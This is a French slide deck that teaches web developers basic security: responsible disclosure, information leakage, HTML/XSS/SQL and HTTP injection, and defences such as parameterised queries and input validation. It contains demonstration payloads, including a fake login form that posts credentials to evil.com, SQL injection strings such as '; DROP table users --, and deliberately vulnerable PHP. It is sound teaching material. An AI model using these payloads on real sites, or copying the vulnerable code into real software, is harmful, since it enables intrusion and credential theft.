# Introduction à la sécurité à l'attention des développeurs web.

--------------------------------------------------------------------------------

# Pourquoi ?

Demain, dans 6 mois, l'année prochaine, ou même peut-être hier, vous mettrez en ligne un site internet.
Ou bien on vous demandera de participer à la réalisation d'un de ces sites.

 * Êtes-vous capable de juger du niveau de sécurité de ce site ?
 * Avez-vous respecté les bonnes pratiques du métier ?
 * Saurez-vous poser les bonnes questions ?
 * Est-ce-que l'on va vous rappeler un dimanche à 2h du matin ?

--------------------------------------------------------------------------------

# Pourquoi ?

Mais aussi parce-que réfléchir aux problématiques de la sécurité pour vos programmes :

  * est très formateur
  * vous demande de lire des documentations 
    * (et ce type de documents fera rarement partie des livres que vous aurez naturellement envie de lire)
  * est amusant

--------------------------------------------------------------------------------

# Amusant ?

.notes: ...Oui

...

![Bounty?](./admin.jpg)

--------------------------------------------------------------------------------

# Amusant ?

  * Voyez cela comme un **défi**
  * Trouver des **failles** dans un système est une pensée très proche de la pensée qui permet de concevoir ces systèmes. Mais c'est une pensée plus récréative.
  * Offrez des chocolats/bières à vos collègues
  * Payez des hackers (bounty)

Vous apprendrez beaucoup en étant d'un côté comme de l'autre.

Vous augmenterez le niveau de sécurité de façon **ludique** avant d'avoir à le faire dans l'urgence et dans des situations qui ne sont pas du tout agréables.

![Bounty?](./bounty.jpg)

--------------------------------------------------------------------------------

# La sécurité ?

Le domaine de la sécurité est très vaste. Il regroupe des éléments plus larges que ceux que nous aborderons pour la sécurité web :

 * les procédures humaines autour du système d'information
 * les failles dans le comportement humain (social engineering)
 * la sécurité matérielle, les accès physiques aux systèmes
 * la gestion des sauvegardes, de la redondance, de la résistance aux pannes
 * (...)

![what?](./security_job.jpg)

--------------------------------------------------------------------------------

# Le niveau juste

> Trop de sécurité tue la sécurité.

Quand le niveau de sécurité augmente, le **niveau de confort descend** (le plus souvent).

Si le niveau de sécurité en place est trop fort, les utilisateurs mettrons en place des moyens dérivés qui ruinerons le travail effectué.

![trouver le juste niveau difficile il sera](./too_much_security.jpg)

Une fois que vous aurez acquis des connaissances en terme de sécurité, il faudra être capable de les doser et de les relativiser par rapport à une vision plus large du système d'information.

--------------------------------------------------------------------------------

# Le niveau juste

Il faut donc analyser votre application de façon globale

  * contenu dynamique/statique ?
  * contributions privées/publiques ?
  * code source public/privé ?
  * réutilisation du code sur d'autres métiers ?
  * hébergement privé/partagé
  * entrées et sorties de l'application
  * ...

Mais attention à ne pas sous-doser.

--------------------------------------------------------------------------------

# Les pédos-nazis de l'Internet

L'immense majorité des attaques informatiques *réussies* ne **proviennent pas d'anonymes** sur internet. Elles sont le plus souvent effectuées en **interne**, par vengeance, par frustration, etc.

![pirates](./lol.png)

En dehors des robots qui scannent l'intégralité du net à la recherche de failles connues, il ne faut pas négliger le potentiel de nuissance des utilisateurs **autorisés** de l'application.

Ce qui peut être aggravé aussi par les risques de **mauvaises manipulations** pour les rôles utilisateurs qui possèdent trop de droits.

--------------------------------------------------------------------------------

# Informer sur la sécurité, donc.

--------------------------------------------------------------------------------

# Ethical Hacking

En terme de **sécurité informatique** le savoir est ouvert et disponible.

 * Il est facile d'acquérir très vite les principales connaissances
 * Ce savoir peut être utilisé pour **créer** et **réparer** (makers, hackers) ou pour **détruire** (manque de maturité, retard de développement social et individuel, lulz, etc.)
 * Peu d'enseignements officiels car ce double usage effraye
 
![Le chemin vers le côté obscure de la force plus aisé est](./yoda.jpg)

Du côté obscur de la force le chemin plus facile semble...

--------------------------------------------------------------------------------

# Ethical Hacking

Pour ma part j'espère que toutes les connaissances que vous réussirez à acquérir seront utilisées pour créer et non le contraire.

Devenir un expert dans le domaine peut devenir complexe car il faut pouvoir apréhender un grand nombre de domaines.

Mais il s'agit le plus souvent de recettes et d'habitudes à prendre, de contrôler des choses déjà compilées par vos pairs.

 * **[OWASP](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project)**

# Hacker vs Cracker

Eric S. Raymond

 * [How to become a Hacker](http://www.catb.org/esr/faqs/hacker-howto.html)
 * [A brief history of hackerdom](http://www.catb.org/esr/writings/homesteading/hacker-history/)

> The basic difference is this: hackers build things, crackers break them.

--------------------------------------------------------------------------------

# Hacker vs Cracker

Dans le domaine particulier de la sécurité on utilise souvent deux termes pour distinguer ces individus :
**Black Hat** et **White Hat**, la différence est la même que chez les magiciens.

Ce qui fera la différence en terme de respect et en **termes juridiques** sur vos contributions dans ce domaine tient en quelques principes très simples :

 * Ne diffusez pas publiquement de failles de sécurité exploitables, pas même sur les bug trackers publiques du projet. Pas de **0 day**.
 * Signalez-les aux équipes dédiées et laissez-leur le temps d'analyser et de corriger le problème
 * Soyez patients, ce temps peut être très long
 * La publication en désaccord avec les gestionnaires du projet peut exister mais doit être justifiable
 (non prise en compte de l'alerte, mise en danger des utilisateurs, etc.)

![Black and White](./gandalf_vader.jpg)


--------------------------------------------------------------------------------

# Le développeur web dans tout ça

Votre serveur web peut être pris pour cible pour plusieurs raisons :

  * Ses **capacités** en terme de calcul et d'accès au réseau (pour les spambots, des DDOS, du stockage de fichiers)
  * Pour le plaisir
  * Pour les **données** qu'il abrite 
    * Les mots de passe des utilisateurs sont souvent identiques d'un site à l'autre
    * Il se peut que certaines données ne soient pas destinées à être publiques
  * Pour nuir, pour du **chantage** (un site rendu inaccessible par un DOS)
 
--------------------------------------------------------------------------------

# Le développeur web dans tout ça

## La connaissance

Si vous ne voulez pas vous apercevoir un matin que google à bloqué votre site ou que votre client vous appelle affolé, vous devez acquérir un minimum de connaissances en terme de sécurité.

La **difficulté** principale est de l'ordre de la connaissance

  * Connaissez-vous vraiment le protocole HTTP ?
  * Maîtrisez-vous les différences subtiles entre un GET et un POST ?
  * Savez-vous ce que fait jQuery.ajax() ?
  * Connaissez-vous les cookies js ? les cookies flash ?
  * Savez-vous à quoi sert le fichier crossdomain.xml ?
  * Saviez-vous que le svg pouvait contenir du javascript ?
  * Comprenez-vous quelque chose à openid ?

Le vecteur d'attaque utilisera sans doute un élément dont vous ignoriez l'existence.

--------------------------------------------------------------------------------

# Le développeur web dans tout ça

## La connaissance

Pour permettre aux développeurs de travailler sans imposer une formation professionelle de dix ans, les outils mis en place fournissent des **niveaux d'abstraction**.

Les failles de sécurité utilisent le plus souvent des **cas limites** de ces abstractions. Et si vous voulez progresser, il faudra toujours essayer de voir plus loin que les abstractions que vous manipulez. Effectivement, il n'y a pas de fin, mais cela fera de vous un meilleur développeur, jour après jour.

> All non-trivial abstractions, to some degree, are leaky<br/>
--Joel Spolsky<br/>
[The Law of Leaky Abstractions](http://www.joelonsoftware.com/articles/LeakyAbstractions.html)

 * Ne sous-estimez pas la valeur du travail collaboratif, personne n'est en mesure de tout maîtriser
 
--------------------------------------------------------------------------------

# Robustesse et Rigueur
 
La grande différence entre du code produit par un débutant et celui produit par un développeur expérimenté réside souvent dans le niveau de **rigueur**.

    /*
     * Feed $arr with the bar key from $toto and arr['foo']
     */
    function foo($toto, &$arr) {
      $bar = $toto->tata . $arr['foo'];
      $arr['bar'] = $bar;
    }

Le code marche (il fait la tâche bizarre qui lui est demandé).

Mais s'il est utilisé en dehors du cadre pour lequel il a été pensé, il peut échouer de façon plus ou moins brutale. Cela va de la génération de **WARNING** (accès à une clef non existante) au **crash complet** (accès à un attribut inexistant).

--------------------------------------------------------------------------------

# Robustesse et Rigueur

> Be conservative in what you do, be liberal in what you accept from others

    /*
     * Feed the bar key of $arr array with $toto->tata and arr['foo']
     *
     * If toto->tata is not yet initialised defaults will be loaded
     *
     * @param ZooInterface $toto Main Zoo object
     * @param array $arr array used by reference, result in case of success is in arr['bar']
     * @throws FooException
     */
    function foo(ZooInterface $toto, &$arr) {
      if (!(is_array($arr)) || !array_key_exists('foo',$arr)) {
        throw new FooException('Second argument of foo should be an array with the foo key already set');
      }
      try {
          if (!isset($toto->tata)) {
            $toto->tata = ZooBase::loadTataDefaults();
          }
          (...)

--------------------------------------------------------------------------------

          (...)
          $bar = $toto->tata . $arr['foo'];
          if (array_key_exists('bar',$arr)) {
            if ($bar === $arr['bar']) {
              $this->log('bar key was already set and is unaltered while running foo.')
            } else {
              throw new FooAlterationException('found a bar kay with a different value while running foo');
            }
          } else {
            $arr['bar'] = $bar;
          }
      } catch (Exception $e) {
        throw new FooException('Foo was unable to make the job!', $e);
      }
    }

> Always wanted to travel back in time to try fighting a younger version of yourself? Software development is the career for you!
 - twitter: Elliot Loh @Loh

--------------------------------------------------------------------------------

## Robustesse et Tricherie

La **robustesse** est importante en terme de sécurité parce que l'attaquant **ne va pas respecter les règles.**

## Un code peu robuste est non sécurisé

Un des aspects important de l'attaque de sécurité est l'utilisation du code et des outils qui sont en place en les **détournant** (hijacking).
L'attaquant se sert de tout ce qui est présent et en détourne l'usage.

 * Toute erreur qui démontre une **absence de robustesse** est potentiellement un vecteur d'attaque

De la même manière qu'en mathématiques, la phrase magique *"Si x est différent de 0"* devrait devenir un mode de pensée obligatoire, le développeur devrait toujours penser aux **cas limites**, à ce qui arrive quand le contrat n'est pas respecté, quand on ne respecte pas les règles.

![Quelles règles ?](licence.gif)

--------------------------------------------------------------------------------

# Les Failles

--------------------------------------------------------------------------------

# Classifier les failles

  * [CVE](http://cve.mitre.org/) : **C**ommon **V**ulnerability **E**xposure

Diffuser l'information pour mieux se protéger, mais aussi pour en comprendre les impacts :

  * Impact sur la confidentialité
  * Impact sur l'intégrité des données
  * Impact sur la disponibilité
  * Complexité d'accès
  * Authentification requise ?
  * Escalade de privilèges ?
  * Type de vulnerabilité

  * [CVE-1999-1293](http://cvedetails.com/cve/CVE-1999-1293/) mod_proxy, DOS, core dump (10.0)
  * [CVE-2013-1643](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-1643) PHP SOAP
--------------------------------------------------------------------------------

# Les principales Failles


--------------------------------------------------------------------------------

# Les principales Failles


## Déni de Service


## Information Disclosure


## Injection

--------------------------------------------------------------------------------

# Déni de service - DOS

Le site web est rendu **inaccessible**, ce qui ouvre la voie aux **concurrents** ou au **chantage**. Il y a plusieurs vecteurs :

  * monopolisation des ressources (sockets, mémoire, processus serveur, disque dur, etc)
  * traitements trop longs (donc monopolisation du CPU)
  * destruction des ressources (crash serveur)
  * autres (cache poisoning, DNS poisoning, ...)

![poussez-vous](./dos.jpg)


--------------------------------------------------------------------------------

# Information Disclosure

On parle ici de **fuites d'informations**. Faire fuir des informations c'est par exemple afficher les messages d'erreur à l'utilisateur.

Une simple recherche Google sur "Notice undefined index in /var/www" me renvoit sur ce site :
![http://www.dmkimmo.com/fiche.html?aid=](undefinex_index.png)
Je connais dès lors le **langage** mais aussi les **chemins** réels sur le disque (et je peux estimer sans trop de risques que le site n'est pas très sécurisé).

Il est souvent très utile de connaître ces chemins pour retrouver les chemins relatifs vers les fichiers intéressants comme /etc/passwd.

--------------------------------------------------------------------------------

# Information Disclosure

Mais ces informations qui aident vos attaquants se cachent à de multiples endroits :

![Apache and PHP versions](info_disclosure2.png)

Ici, nous avons la version d'Apache httpd, la version de PHP, l'OS (gentoo) et même la version d'OpenSSL.

--------------------------------------------------------------------------------

# Information Disclosure

Comparez avec les entêtes du site reddit

    $ curl -I www.reddit.com
    
    HTTP/1.1 200 OK
    Content-Type: text/html; charset=UTF-8
    x-frame-options: SAMEORIGIN
    x-content-type-options: nosniff
    x-xss-protection: 1; mode=block
    Server: '; DROP TABLE servertypes; --
    Date: Mon, 09 Jun 2014 16:09:39 GMT
    Connection: keep-alive
    Vary: accept-encoding


--------------------------------------------------------------------------------

# Information Disclosure

Retenez :

  * Il ne faut pas faciliter la tâche à votre assaillant
  * Ne lui donnez pas la liste des failles qu'il peut tenter
  * Un serveur qui "parle" trop incite l'assaillant à tenter plus de choses, cela démontre un faible niveau de sécurité
  * Chaque information peut-être réutilisée (pensez social engineering)
  * Si vous affichez des informations inutiles, pensez à tromper votre assaillant

--------------------------------------------------------------------------------

# Injections

> Presque toutes les failles sont des failles d'injection, si on veut.
-- Moi.

En mieux :

> SQL injection is a special case of syntax tree mutation. *All* languages are susceptible to it, and everything is a langage. #langsec
 - twitter: active wreck chords @jcoglan

--------------------------------------------------------------------------------

## Injection - HTML

    !html
    <input type="text" name="search" value="<? echo $_GET['search']; ?>">

Entrez ceci :

    !html
     What?"><h1>Oups</h1><input type="checkbox

Et le résultat :

    !html
    <input type="text" name="search" value="What?">
    <h1>Oups</h1>
    <input type="checkbox">

--------------------------------------------------------------------------------

## Injection - HTML

Pas grave ? essayez :

    !html
    " ><div class="big-overlay"></form>
    <form method="POST" action="http://www.evil.com">
      <p class="secure">Please re-enter you credentials</p>
      <label>Login:</label>
        <input type="text">
      <label>Mot de passe:</label>
        <input type="password">
    </div>
    <foo "

Et vous avez un formulaire de login en popup, détourné vers un autre site.

--------------------------------------------------------------------------------

## Injection - Javascript

    !html
    <input type="text" name="search" value="<? echo $_GET['search']; ?>">

Entrez ceci :

    !html
     What?" onLoad="alert('xss');"><input type="checkbox

Et le résultat :

    !html
    <input type="text" name="search" value="What?"
     onLoad="alert('xss');">
    <input type="checkbox">

En javascript on peut faire **TOUT** ce qui est imaginable en HTML, et **plus encore**. Détourner du contenu, poster des requêtes de façon transparentes, charger d'autres sources javascript depuis d'autres sites, etc.

Le **XSS** (Cross Site Scripting) est votre pire ennemi.

Les moteurs de **recherche** dans les sites et les codes 'SEO' sont très souvent sensibles.

--------------------------------------------------------------------------------

## Injection - HTTP

### GET et POST : ce n'est pas la même chose

Ils sont tous les deux manipulables, de ce point de vue là, pas de différences. Mais :

> GET est **indempotent**

  * Une requêtes GET peut être rejouée n fois sans risques
  * Une requête GET ne doit jamais conduire à une modification du SI
  * Ce serait bien pratique parfois ?
    * Passez par une confirmation via formulaire puis POST
    * Ou bien utiliser du javascript et de l'ajax pour passer une requête POST

Il y a des liens GET partout dans une page, et le navigateur les charge sans vous demander, il peut même le faire depuis un site distant.

    !html
    <IMG SRC='/user/logout' /> <!-- dans un commentaire c'est #?!^" -->
    <IMG SRC='/user/delete/42' /> <!-- pour l'admin... -->

--------------------------------------------------------------------------------

## Injection - HTTP

Mon petit violon d'Ingres.

 - "Empoisonnement de cache", "Contrebande HTTP", "Division de réponse"
 - jouer sur les interpretations différentes de messages HTTP entre les serveurs caches et les serveurs applicatifs
 - injecter du contenu de "header +body HTTP" dans un Header HTTP comme "Location".
 - jouer sur la taille des messages transmis (Content-Length, Chunked Transfer, dépassements d'entiers, etc)
 - **[HAProxy](http://www.haproxy.org/)** est votre meilleur allié

--------------------------------------------------------------------------------

## Injection - HTTP

Trouvez les deux erreurs dans ces entêtes HTTP :

    HTTP/1.1 200 OK
    Date: Thu, 23 Apr 2015 14:55:13 GMT
    Server: Apache
    Content-Type: text/plain
    Access-Control-Allow-Origin: *
    Cache-Control: max-age=300, public
    Content-Length: 250
    Connection: keep-alive
    Content-Length: 10
    Transfer-Encoding: chunked

--------------------------------------------------------------------------------

## Injection - HTTP

Trouvez les deux erreurs dans ces entêtes HTTP :

    HTTP/1.1 200 OK
    Date: Thu, 23 Apr 2015 14:55:13 GMT
    Server: Apache
    Content-Type: text/plain
    Access-Control-Allow-Origin: *
    Cache-Control: max-age=300, public
    Content-Length: 250    <----------------------------------
    Connection: keep-alive
    Content-Length: 10     <----------------------------------
    Transfer-Encoding: chunked     <--------------------------

* Deux entêtes Content-Length, lequel a raison ?
* Content-Length + chunks : lequel a raison ?

--------------------------------------------------------------------------------

## Injection - SQL

Revenons à un cas simple. La plus connue. L'injection SQL.

Le cas classique est un formulaire de login, le programme reçoit deux arguments depuis une requête POST :

  * le login utilisateur
  * le mot de passe utilisateur

Et il fait une requête SQL pour vérifier que les deux correspondent ... d'une horrible manière :

    !php
    $login = $_POST['login']; $password = $_POST['password'];
    $sql = "SELECT id FROM users WHERE `login`='$login'";
    $sql .= " and `password`=PASSWORD($password)";
    $result = $db->query($sql);
    if (count( $result) > 0) {
        (...)

Le jeu consiste alors à insérer du SQL dans la requête SQL ...

--------------------------------------------------------------------------------

## Injection - SQL

    !html
        login      admin
        password   ') OR '1' = '1

Ou encore

    !html
        login      '; DROP table users --

L'injection SQl est très connue car elle est puissante. Elle permet de passer outre les **sécurités d'accès**, de **détruire** ou de modifier des données (UPDATE, INSERT, DELETE, TRUNCATE) voir d'**extraire n'importe quelle information** de la base (requêtes UNION, requête sur information_schema, time-based attacks).

Il existe des moyens de s'en protéger. Certains sont bons, d'autres sont très bons, d'autres très mauvais.

--------------------------------------------------------------------------------

## Injection - SQL - protection

### Méthode 0 : échapper les quotes (houuuu)

    !php
    "SELECT id FROM users WHERE `login`='"
      . addslashes($login)
      . "' and `password`=PASSWORD('"
      . addslashes($password)
      . "')";

Ceci transforme les quotes ' en \'. C'est **très insuffisant**.

### Méthode 1 : utiliser les échappements officiels

    !php
    "SELECT id FROM users WHERE `login`='"
      . mysql_real_escape_string($login, $db)
      . "' and `password`=PASSWORD('"
      . mysql_real_escape_string($password, $db)
      . "')";

> mysql_real_escape_string() appelle la fonction mysql_escape_string() de la bibliothèque MySQL qui ajoute un anti-slash aux caractères suivants : NULL, \x00, \n, \r, \, ', " et \x1a.

--------------------------------------------------------------------------------

## Injection - SQL - Protection

### Méthode 2 : utiliser les requêtes paramétrées

C'est une protection ultime (tant que la librairie qui abstrait votre connexion à la base fait bien ce qu'elle prétend faire).

    !php
    $sql = "SELECT id FROM users WHERE `login`=:login"
    $sql .= " and `password`=PASSWORD(:pwd)";
    $args = array(
      'login' => $_POST['login'],
      'pwd' => $_POST['password']
    );
    $result = $db->query($sql, $args);

Le moteur SQL reçoit d'un côté la requête SQL et de l'autre les arguments à insérer dans cette requête.

La requête est compilée sous la forme d'un arbre d'exécution **AVANT** que les arguments ne soient ajoutés dans cette requête.
Ces arguments ne pourront donc **JAMAIS** être eux-mêmes interprétés comme du SQL.

**Pas d'injection!**

--------------------------------------------------------------------------------


# Se Protéger

--------------------------------------------------------------------------------

# Se Protéger

## Entrées et Sorties

## Sécurité en profondeur

## Blindage de configuration

--------------------------------------------------------------------------------

# Entrées et Sorties

## Principe du KISS

 * **K**eep **I**t **S**tupid **S**imple

Décomposez les tâches complexes en sous-ensembles simples, appréhendables

## Boîte Noire, Flux In flux Out

Chacune de ces tâches peut être vue comme une boîte qui accepte des entrées et génère des sorties :

![Black Box 1](in_out.png)

--------------------------------------------------------------------------------

## Boîte Noire, Flux In flux Out

La boîte noire se décompose elle-même en un sous-ensemble de boîtes qui interagissent. Il y a des flux entrants et sortants pour chacune.

![Black Boxes](inception.gif)

Ce principe est aussi applicable à l'ensemble. 

![Black Box 1](in_out2.png)

--------------------------------------------------------------------------------

# Validez les entrées

--------------------------------------------------------------------------------

# Filtrez les sorties

--------------------------------------------------------------------------------

## Validez les entrées

 * Rejetez ce que vous pouvez
 * La plus simple des entrées est un entier

Exemple :

    !php
    $foo = (int) $_GET['foo'];
    

 * Vérifiez les **tailles** min/max
 * Utilisez des listes blanches si possible

Exemple :

    !php
    if ( ! in_array($_GET['foo'],array('red','green','blue'))) {
       throw new WTFException("Only 'red', 'green' and 'blue' values are allowed");
    }


 * Essayez de rester dans l'**ascii7** agrémenté de quelques caractères ( '-', '_' ).

--------------------------------------------------------------------------------

## Validez les entrées

 * Le texte brut est par nature complexe (encoding utf-8 ?)
![XKCD 1137 RTL](./rtl.png)
 * Si vous souhaitez dès la validation des entrées n'accepter qu'un sous-ensemble du HTML, faites très attention aux expressions régulières
 [HTML can't be parsed by regex](http://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454)
 * faites attention aux messages de rejets, c'est peut-être ce message d'erreur qui est ciblé par le contenu.

source XKCD : [http://www.xkcd.com/1137/](http://www.xkcd.com/1137/)

--------------------------------------------------------------------------------

## Filtrez les sorties

Les règles d'**échappement** sont **propres à chaque sortie** et visent à éviter le principe des attaques par **injection**.

 * **Page HTML** -> balises HTML -> encodage de caractères HTML ('<' => &amp;lt; 'é' => &amp;eacute;)
 * **url** -> encodage d'URL -> (espace => %20, '=' => %3D, etc.)
 * Fichier **CSV** -> séparateurs ',' ; des délimiteurs '"', retours chariots, etc.
 * Fichier sur disque : chemins, caractères spéciaux
 * SGBD -> échapper le SQL, paramétrer

Ces filtrages sont **propres à chaque sortie** ==> ils ne doivent normalement pas être effectués à la validation, en entrée, puisqu'ils sont différents en fonction des canaux de sortie.

**Une sortie non ou mal filtrée est la base de la majorité des attaques de sécurité dans le domaine du web.**

--------------------------------------------------------------------------------

# Validate INPUT, filter OUTPUT

Si vous ne devez retenir que deux choses, retenez ces éléments-là.

**Validation** des entrées, **Filtrage** des sorties.

Face à un projet essayez d'identifier très vite les éléments qui servent à ces deux tâches.

--------------------------------------------------------------------------------

# Sécurité en profondeur

Ce principe est le deuxième grand principe (après les validations et filtrages). Les différentes couches, ou strates, d'un système d'information ont **toujours** des failles. Ne faites jamais une confiance aveugle aux autres briques de la solution.

> Ne faites jamais confiance aux étapes précédant votre code pour bloquer les attaques !

 * Vous limiterez les dégats en cas de faille
 * Vous compliquerez la découverte des failles (en cas d'absence de réponse positive, l'assaillant ne sait peut-être pas qu'il avait passé avec succès l'une des barrières)

> Soyez paranoïaques, on parle de systèmes automatisés, ces systèmes ont très peu de bon sens, ils peuvent laisser entrer un éléphant dans votre salon si celui-ci conduit votre voiture, porte votre cravate et possède les clefs de la maison.
![BANKSY](./banksy.jpg)

(photo elephant: banksy)

--------------------------------------------------------------------------------

# Auto-testez vous

 * Prenez l'habitude de tester votre application avec des contenus *limites*
 * utilisez des outils: metasploit, nessus, etc.
 * utilisez vos collègues (bounty)

# Un projet peut être très mauvais en terme de sécurité et avoir du succès.

Ne surestimez pas vos pairs, encore moins les utilisateurs, et surtout, pensez aux commerciaux.

Un produit sécurisé est souvent identique fonctionnellement au même produit sans la sécurité et sans la robustesse.

**Que vaut la sécurité quand les plates-formes changent tous les ans, que le marché s'emballe pour la nouveauté ?**

> Jusqu'ici tout va bien...

--------------------------------------------------------------------------------

# Blindage de configuration

Ce principe est l'une des applications du principe précédent. Une application sécurisée n'existe pas si le système d'information qui héberge cette application n'est pas pris en compte.

Ceci concerne sans doute moins le développeur que son accolyte responsable de la configuration du système d'information, le **sysadmin**. On rencontre aussi très souvent quelqu'un qui est un peu mauvais (j'assume, j'en suis) dans les deux domaines et que l'on nomme **dev-op**, il a cependant assez de connaissances dans les deux domaines pour essayer de faire la jonction.

En terme de sécurité, cette jonction est importante. Il faut trouver les bons réglages pour autoriser les fonctionnalités attendues sans ouvrir de failles de sécurité.

Pour aujourd'hui, je ne vous ferais pas un cours détaillé sur l'administration système mais je liste quelques principes :

  * isolement, cloisonnement
  * restriction de droits, création de rôles par droits
  * supervision des ressources
  * connaissance des paramètres de configuration
  * conservatisme (le bon sysadmin est souvent moins *hype* que le développeur web)

--------------------------------------------------------------------------------

# Une dernière pour la route ?

    GRANT ALL PRIVILEGES ON `db_user1`.* TO 'user1'@'%';
    GRANT ALL PRIVILEGES ON `db_user2`.* TO 'user2'@'%';
    GRANT ALL PRIVILEGES ON `db_user%`.* TO 'user%'@'localhost';
    GRANT SELECT ON `db_user%`.`foo` TO 'bar'@'localhost';

![FUN](./fun.gif)

--------------------------------------------------------------------------------

# Une dernière pour la route ?

    GRANT ALL PRIVILEGES ON `db\_user1`.* TO 'user1'@'%';
    GRANT ALL PRIVILEGES ON `db\_user2`.* TO 'user2'@'%';
    GRANT ALL PRIVILEGES ON `db\_user\%`.* TO 'user%'@'localhost';
    GRANT SELECT ON `db_user%`.`foo` TO 'bar'@'localhost';

![FUN](./fun.gif)

> MYSQL: The “_” and “%” wildcards are permitted when specifying database names in GRANT statements that grant privileges at the global or database levels.
